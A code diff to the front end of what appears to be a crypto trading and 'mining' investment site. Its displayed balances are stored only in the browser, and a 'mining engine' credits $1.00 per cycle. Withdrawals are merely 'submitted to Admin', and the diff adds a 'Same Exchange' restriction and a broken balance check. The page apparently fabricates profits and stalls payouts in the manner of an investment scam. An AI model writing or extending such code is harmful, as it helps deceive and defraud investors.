@@ -735,7 +735,7 @@
             }
         } catch(e) {}
     }
-    setInterval(checkApprovalStatus, 6000); // Polls every 6 seconds
+    setInterval(checkApprovalStatus, 6000);
 
     // Live Activity Heartbeat
     let isHeartbeatRunning = false;
@@ -927,7 +927,7 @@
                 <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#94a3b8;">Full Name:</span><span style="color:#fff; font-weight:bold;">${currentUser.fname} ${currentUser.lname}</span></div>
                 <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#94a3b8;">Email:</span><span style="color:#fff; font-weight:bold;">${currentUser.email}</span></div>
                 <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#94a3b8;">Phone:</span><span style="color:#fff; font-weight:bold;">${currentUser.phone}</span></div>
-                <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#94a3b8;">Status:</span><span style="color:#10b981; font-weight:bold;">Verified Trader</span></div>
+                <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#10b981; font-weight:bold;">Verified Trader</span></div>
             </div>
             <button class="btn" onclick="handleLogout()" style="background:#dc2626; margin-top:15px; margin-bottom:0;">Sign Out</button>
         `;
@@ -1058,7 +1058,7 @@
         reader.readAsDataURL(file);
     }
 
-    // 6. Withdrawal Logic
+    // 6. Withdrawal Logic (With Same Exchange Warning & Reset Mechanism)
     function handleWithdrawalClick() {
         let currentDeposit = parseFloat(localStorage.getItem('depositBal')) || 0.00;
         let currentAmount = parseFloat(localStorage.getItem('currentBal')) || 0.00;
@@ -1073,9 +1073,11 @@
 
         let withdrawHtml = `
             <div style="text-align:left; font-size:12px; color:#cbd5e1; line-height:1.5;">
-                <p style="margin:0 0 6px 0; font-weight:bold; color:#f8fafc;">Withdrawal Gateway (BEP20 USDT):</p>
+                <div class="warning-box" style="border-color:#f59e0b; color:#fbbf24; background:rgba(245, 158, 11, 0.1);">
+                    ⚠️ <b>SECURITY PROTOCOL:</b> Withdrawal must be requested strictly to the <b>same Exchange / Wallet Address</b> used during your initial deposit. Transfers to mismatching addresses will be rejected.
+                </div>
                 <div class="input-group" style="margin-bottom:10px;">
-                    <label>Your BEP20 Wallet Address</label>
+                    <label>Your Registered Deposit Wallet Address (BEP20)</label>
                     <input type="text" id="wd-address" class="input-control" placeholder="0x..." style="padding:8px 10px;">
                 </div>
                 <div class="input-group" style="margin-bottom:14px;">
@@ -1094,8 +1096,16 @@
         const amtInput = document.getElementById('wd-amount').value.trim();
         const amt = parseFloat(amtInput);
 
+        let currentBal = parseFloat(localStorage.getItem('currentBal')) || 0.00;
+        let depositBal = parseFloat(localStorage.getItem('depositBal')) || 0.00;
+
         if (!addr || isNaN(amt) || amt < 50) {
             alert('Minimum withdrawal amount is $50.00 and valid BEP20 address is required.');
+            return;
+        }
+
+        if (currentBal - amt < depositBal && currentBal - amt < 0) {
+            alert('Insufficient balance. You cannot withdraw more than your available profits above base capital.');
             return;
         }
 
@@ -1112,9 +1122,19 @@
             );
         }
 
+        // Reset Balance: Deduct withdrawal amount and reset back to baseline ($100.00 base)
+        let newCurrent = Math.max(depositBal, currentBal - amt);
+        let currentWd = parseFloat(localStorage.getItem('withdrawalBal')) || 0.00;
+        
+        localStorage.setItem('currentBal', newCurrent.toFixed(2));
+        localStorage.setItem('equityBal', newCurrent.toFixed(2));
+        localStorage.setItem('withdrawalBal', (currentWd + amt).toFixed(2));
+
+        loadSavedBalances();
         closePopup();
+
         setTimeout(() => {
-            showPopup('✅ Withdrawal Submitted', `Your withdrawal request of $${amt.toFixed(2)} has been submitted to Admin for processing.`);
+            showPopup('✅ Withdrawal Submitted', `Your withdrawal request of $${amt.toFixed(2)} has been submitted to Admin for processing.\n\nYour available trading balance has been reset to base deposit ($${newCurrent.toFixed(2)}).`);
         }, 300);
     }
 
@@ -1160,6 +1180,7 @@
                 <ul style="padding-left:16px; margin:0 0 10px 0;">
                     <li><b>First Cycle Completion:</b> To maintain strategy liquidity, initial deposits undergo a full cycle until cumulative profits equal the initial capital base.</li>
                     <li><b>Standard Minimum Withdrawal:</b> Once the initial milestone is reached, subsequent regular withdrawals have a minimum threshold of $50.</li>
+                    <li><b>Same Exchange Protocol:</b> Withdrawals are cleared exclusively back to the original deposit exchange source address.</li>
                     <li><b>Early Capital Exit / Account Termination:</b> If a user requests an early account closure before completing the full operational cycle, they are permitted to withdraw all accumulated profits generated up to that date, and the account will be closed.</li>
                     <li><b>Payout Timelines:</b> All withdrawal requests are processed within a 24 to 48 hour security clearance window.</li>
                 </ul>
@@ -1305,7 +1326,7 @@
     setInterval(updateClock, 1000);
     updateClock();
 
-    // 12. Mining Engine
+    // 12. Mining Engine (Updates Sheet Columns K & L Automatically)
     function loadMiningHistory() {
         let historyLogs = JSON.parse(localStorage.getItem('userMiningHistory')) || [];
         const tbody = document.getElementById('history-rows');
@@ -1387,17 +1408,16 @@
                 historyLogs.unshift(newLog);
                 localStorage.setItem('userMiningHistory', JSON.stringify(historyLogs));
 
+                // Send Mining Profit to Sheet (Auto Updates Columns K & L)
                 if (currentUser) {
                     sendToGoogleSheet(currentUser.fname + " " + currentUser.lname, currentUser.email, currentUser.phone, "MINING_PROFIT", "$1.00", "-", "No SS", "Verified");
                 }
 
                 let currentBal = (parseFloat(localStorage.getItem('currentBal')) || 0.00) + 1.0;
                 let equityBal = (parseFloat(localStorage.getItem('equityBal')) || 0.00) + 1.0;
-                let withdrawalBal = (parseFloat(localStorage.getItem('withdrawalBal')) || 0.00) + 1.0;
 
-                localStorage.setItem('currentBal', currentBal);
-                localStorage.setItem('equityBal', equityBal);
-                localStorage.setItem('withdrawalBal', withdrawalBal);
+                localStorage.setItem('currentBal', currentBal.toFixed(2));
+                localStorage.setItem('equityBal', equityBal.toFixed(2));
 
                 loadSavedBalances();
                 loadMiningHistory();
